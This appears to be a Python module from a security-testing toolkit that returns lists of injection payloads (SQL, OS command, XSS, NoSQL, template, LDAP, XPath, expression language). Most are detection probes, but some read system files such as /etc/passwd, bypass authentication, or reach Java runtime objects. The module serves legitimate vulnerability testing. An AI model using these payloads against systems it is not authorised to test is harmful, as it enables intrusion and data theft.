#!/usr/bin/env python3
"""
Payload generation utilities for injection testing.

These are reference implementations providing common injection payloads
for various vulnerability types. Adapt payloads based on the specific
application context (database type, OS, framework, etc.).

Usage:
    from injection_payloads import (
        get_sqli_payloads,
        get_cmdi_payloads,
        get_xss_payloads,
        get_nosql_payloads,
        get_ssti_payloads
    )

    # Get SQL injection payloads for time-based detection
    payloads = get_sqli_payloads(detection="time", db_type="mysql")
"""

from typing import List, Dict, Any


def get_sqli_payloads(detection: str = "all", db_type: str = "generic") -> List[Dict[str, Any]]:
    """
    Get SQL injection payloads.

    Args:
        detection: Detection type ("time", "error", "boolean", "all")
        db_type: Database type ("mysql", "postgres", "mssql", "sqlite", "generic")

    Returns:
        List of payload dictionaries with payload and metadata
    """
    payloads = []

    # Time-based payloads
    time_payloads = {
        "mysql": [
            {"payload": "' OR SLEEP(5)--", "delay": 5},
            {"payload": "' OR SLEEP(5)#", "delay": 5},
            {"payload": "1' AND SLEEP(5)--", "delay": 5},
            {"payload": "1; SELECT SLEEP(5)--", "delay": 5},
        ],
        "postgres": [
            {"payload": "'; SELECT pg_sleep(5)--", "delay": 5},
            {"payload": "' OR pg_sleep(5)--", "delay": 5},
        ],
        "mssql": [
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
            {"payload": "' WAITFOR DELAY '0:0:5'--", "delay": 5},
        ],
        "sqlite": [
            {"payload": "' AND 1=randomblob(500000000)--", "delay": 3},
        ],
        "generic": [
            {"payload": "' OR SLEEP(5)--", "delay": 5},
            {"payload": "'; SELECT pg_sleep(5)--", "delay": 5},
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
        ],
    }

    # Error-based payloads (database-specific)
    error_payloads = {
        "generic": [
            {"payload": "'", "type": "single_quote"},
            {"payload": '"', "type": "double_quote"},
            {"payload": "`", "type": "backtick"},
            {"payload": "1'1", "type": "syntax_error"},
            {"payload": "1 AND 1=CONVERT(int,'a')--", "type": "type_conversion"},
            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
        ],
        "sqlite": [
            {"payload": "'", "type": "single_quote"},
            {"payload": "' OR '", "type": "unclosed_string"},
            {"payload": "1' AND '1", "type": "syntax_break"},
            {"payload": "' UNION SELECT 1--", "type": "union_error"},
            {"payload": "' ORDER BY 9999--", "type": "order_by_error"},
            {"payload": "1; SELECT 1", "type": "stacked_query"},
        ],
        "mysql": [
            {"payload": "'", "type": "single_quote"},
            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
            {"payload": "' AND updatexml(1,concat(0x7e,version()),1)--", "type": "updatexml"},
        ],
        "postgres": [
            {"payload": "'", "type": "single_quote"},
            {"payload": "' AND 1=CAST('a' AS INTEGER)--", "type": "cast_error"},
        ],
    }

    # Boolean-based payloads
    boolean_payloads = [
        {"true_payload": "' OR '1'='1", "false_payload": "' OR '1'='2"},
        {"true_payload": "' OR 1=1--", "false_payload": "' OR 1=2--"},
        {"true_payload": "1 OR 1=1", "false_payload": "1 AND 1=2"},
        {"true_payload": "' OR 'a'='a", "false_payload": "' OR 'a'='b"},
        # SQLite-friendly (no comments needed)
        {"true_payload": "1' OR '1'='1", "false_payload": "1' AND '1'='2"},
        {"true_payload": "' OR 1=1 OR '1'='1", "false_payload": "' AND 1=2 AND '1'='1"},
    ]

    if detection in ["time", "all"]:
        db_payloads = time_payloads.get(db_type, time_payloads["generic"])
        for p in db_payloads:
            payloads.append({"type": "time", "db": db_type, **p})

    if detection in ["error", "all"]:
        db_error_payloads = error_payloads.get(db_type, error_payloads["generic"])
        for p in db_error_payloads:
            payloads.append({"type": "error", "db": db_type, **p})

    if detection in ["boolean", "all"]:
        for p in boolean_payloads:
            payloads.append({"type": "boolean", **p})

    return payloads


def get_cmdi_payloads(os_type: str = "linux", detection: str = "time") -> List[Dict[str, Any]]:
    """
    Get OS command injection payloads.

    Args:
        os_type: Operating system ("linux", "windows", "both")
        detection: Detection type ("time", "output", "both")

    Returns:
        List of payload dictionaries
    """
    payloads = []

    # Linux time-based
    linux_time = [
        {"payload": "; sleep 5", "delay": 5, "separator": ";"},
        {"payload": "| sleep 5", "delay": 5, "separator": "|"},
        {"payload": "& sleep 5", "delay": 5, "separator": "&"},
        {"payload": "`sleep 5`", "delay": 5, "separator": "backtick"},
        {"payload": "$(sleep 5)", "delay": 5, "separator": "subshell"},
        {"payload": "\nsleep 5", "delay": 5, "separator": "newline"},
    ]

    # Linux output-based
    linux_output = [
        {"payload": "; echo INJECTION_MARKER", "marker": "INJECTION_MARKER"},
        {"payload": "| id", "marker": "uid="},
        {"payload": "; whoami", "marker": None},
        {"payload": "| cat /etc/passwd", "marker": "root:"},
    ]

    # Windows time-based
    windows_time = [
        {"payload": "& ping -n 5 127.0.0.1", "delay": 5, "separator": "&"},
        {"payload": "| ping -n 5 127.0.0.1", "delay": 5, "separator": "|"},
        {"payload": "& timeout 5", "delay": 5, "separator": "&"},
    ]

    # Windows output-based
    windows_output = [
        {"payload": "& echo INJECTION_MARKER", "marker": "INJECTION_MARKER"},
        {"payload": "| whoami", "marker": None},
        {"payload": "& type C:\\Windows\\win.ini", "marker": "[fonts]"},
    ]

    if os_type in ["linux", "both"]:
        if detection in ["time", "both"]:
            for p in linux_time:
                payloads.append({"type": "time", "os": "linux", **p})
        if detection in ["output", "both"]:
            for p in linux_output:
                payloads.append({"type": "output", "os": "linux", **p})

    if os_type in ["windows", "both"]:
        if detection in ["time", "both"]:
            for p in windows_time:
                payloads.append({"type": "time", "os": "windows", **p})
        if detection in ["output", "both"]:
            for p in windows_output:
                payloads.append({"type": "output", "os": "windows", **p})

    return payloads


def get_xss_payloads(context: str = "html") -> List[Dict[str, Any]]:
    """
    Get XSS payloads.

    Args:
        context: Injection context ("html", "attribute", "javascript", "all")

    Returns:
        List of payload dictionaries
    """
    payloads = []

    # HTML context
    html_payloads = [
        {"payload": "<script>alert(1)</script>", "type": "script_tag"},
        {"payload": "<img src=x onerror=alert(1)>", "type": "img_onerror"},
        {"payload": "<svg onload=alert(1)>", "type": "svg_onload"},
        {"payload": "<body onload=alert(1)>", "type": "body_onload"},
        {"payload": "<iframe src=javascript:alert(1)>", "type": "iframe_js"},
    ]

    # Attribute context
    attr_payloads = [
        {"payload": '" onmouseover="alert(1)', "type": "event_break_double"},
        {"payload": "' onfocus='alert(1)", "type": "event_break_single"},
        {"payload": '" autofocus onfocus="alert(1)', "type": "autofocus"},
        {"payload": "javascript:alert(1)", "type": "javascript_uri"},
    ]

    # JavaScript context
    js_payloads = [
        {"payload": "';alert(1)//", "type": "string_break"},
        {"payload": '";alert(1)//', "type": "string_break_double"},
        {"payload": "</script><script>alert(1)</script>", "type": "script_break"},
    ]

    if context in ["html", "all"]:
        for p in html_payloads:
            payloads.append({"context": "html", **p})

    if context in ["attribute", "all"]:
        for p in attr_payloads:
            payloads.append({"context": "attribute", **p})

    if context in ["javascript", "all"]:
        for p in js_payloads:
            payloads.append({"context": "javascript", **p})

    return payloads


def get_nosql_payloads(db_type: str = "mongodb") -> List[Dict[str, Any]]:
    """
    Get NoSQL injection payloads.

    Args:
        db_type: NoSQL database type ("mongodb", "couchdb")

    Returns:
        List of payload dictionaries
    """
    payloads = []

    if db_type == "mongodb":
        payloads = [
            {
                "type": "operator",
                "payload": {"$gt": ""},
                "description": "Greater than empty string - returns all",
            },
            {
                "type": "operator",
                "payload": {"$ne": None},
                "description": "Not equal null - auth bypass",
            },
            {
                "type": "operator",
                "payload": {"$ne": ""},
                "description": "Not equal empty - auth bypass",
            },
            {
                "type": "regex",
                "payload": {"$regex": ".*"},
                "description": "Match all regex",
            },
            {
                "type": "where",
                "payload": {"$where": "1==1"},
                "description": "JavaScript where clause",
            },
            {
                "type": "or",
                "payload": {"$or": [{"a": 1}, {"b": 1}]},
                "description": "OR condition injection",
            },
        ]

    return payloads


def get_ssti_payloads(engine: str = "all") -> List[Dict[str, Any]]:
    """
    Get Server-Side Template Injection payloads.

    Args:
        engine: Template engine ("jinja2", "twig", "freemarker", "all")

    Returns:
        List of payload dictionaries
    """
    payloads = []

    # Detection payloads (math evaluation)
    detection = [
        {"payload": "{{7*7}}", "expected": "49", "engines": ["jinja2", "twig"]},
        {"payload": "${7*7}", "expected": "49", "engines": ["freemarker", "velocity"]},
        {"payload": "<%= 7*7 %>", "expected": "49", "engines": ["erb", "ejs"]},
        {"payload": "#{7*7}", "expected": "49", "engines": ["ruby", "java_el"]},
        {"payload": "{{7*'7'}}", "expected": "7777777", "engines": ["jinja2"]},
    ]

    # Jinja2 specific
    jinja2_payloads = [
        {"payload": "{{config}}", "type": "config_leak"},
        {"payload": "{{self}}", "type": "self_reference"},
        {"payload": "{{''.__class__}}", "type": "class_access"},
    ]

    # Twig specific
    twig_payloads = [
        {"payload": "{{_self.env}}", "type": "env_access"},
        {"payload": "{{app.request}}", "type": "request_access"},
    ]

    # Freemarker specific
    freemarker_payloads = [
        {"payload": "${.data_model.keySet()}", "type": "data_model"},
        {"payload": "<#assign x=7*7>${x}", "type": "assign_eval"},
    ]

    # Add detection payloads
    for p in detection:
        if engine == "all" or engine in p["engines"]:
            payloads.append({"type": "detection", **p})

    # Add engine-specific payloads
    if engine in ["jinja2", "all"]:
        for p in jinja2_payloads:
            payloads.append({"engine": "jinja2", **p})

    if engine in ["twig", "all"]:
        for p in twig_payloads:
            payloads.append({"engine": "twig", **p})

    if engine in ["freemarker", "all"]:
        for p in freemarker_payloads:
            payloads.append({"engine": "freemarker", **p})

    return payloads


def get_ldap_payloads() -> List[Dict[str, Any]]:
    """
    Get LDAP injection payloads.

    Returns:
        List of payload dictionaries
    """
    return [
        {"payload": "*", "type": "wildcard", "description": "Match all entries"},
        {"payload": "*)(&", "type": "filter_break", "description": "Break filter syntax"},
        {"payload": "*)(uid=*))(|(uid=*", "type": "or_injection"},
        {"payload": "admin)(&)", "type": "null_filter"},
        {"payload": "x)(|(cn=*", "type": "cn_wildcard"},
    ]


def get_xpath_payloads() -> List[Dict[str, Any]]:
    """
    Get XPath injection payloads.

    Returns:
        List of payload dictionaries
    """
    return [
        {"payload": "' or '1'='1", "type": "boolean"},
        {"payload": "' or ''='", "type": "empty_string"},
        {"payload": "admin' or '1'='1", "type": "auth_bypass"},
        {"payload": "'] | //user/*[contains(*,'", "type": "union"},
    ]


def get_el_payloads() -> List[Dict[str, Any]]:
    """
    Get Expression Language injection payloads.

    Returns:
        List of payload dictionaries for Java EL, Spring EL, OGNL
    """
    return [
        # Java EL
        {"payload": "${7*7}", "expected": "49", "type": "java_el"},
        {"payload": "#{7*7}", "expected": "49", "type": "java_el"},
        {"payload": "${applicationScope}", "type": "scope_access"},
        # Spring EL
        {"payload": "${T(java.lang.Runtime)}", "type": "spring_el"},
        # OGNL
        {"payload": "%{7*7}", "expected": "49", "type": "ognl"},
        {"payload": "${#rt = @java.lang.Runtime@getRuntime()}", "type": "ognl_runtime"},
    ]
